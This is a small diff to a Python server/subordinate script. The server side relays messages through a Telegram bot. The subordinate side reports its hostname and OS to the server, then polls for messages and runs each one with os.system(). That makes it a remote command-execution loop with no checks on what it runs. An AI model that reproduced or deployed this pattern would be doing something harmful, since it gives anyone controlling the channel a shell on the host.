@@ -1,24 +1,23 @@
 from configs import ROLE
 from Server.twm import TellWithMe as SeTWM
 from Subord.twm import TellWithMe as SuTWM
-import threading, os, subprocess, socket, platform
+import os, subprocess, socket, platform, time
 
 if ROLE == "Server":
     from configs import MAIN_USER_ID
     from Server.main import bot
     twm = SeTWM()
     subprocess.Popen(["python3", "Server/main.py"])
-    checkMail = threading.Timer(3.5, twm.receive())
     while True:
-        receive, flag = checkMail.start()
+        receive, flag = twm.receive()
         bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}")
-        
+        time.sleep(3.5)
         
          
 else:
     twm = SuTWM()
     twm.send(twm.compileCommand("IND", {"name": socket.gethostname(), "os": platform.platform()}), "0.0.0", "IND", "Hi Server! Can you give me an address?")
-    checkMail = threading.Timer(3.5, twm.receive())
     while True:
-        receive, flag = checkMail.start()
+        receive, flag = twm.receive()
         os.system(receive)
+        time.sleep(3.5)
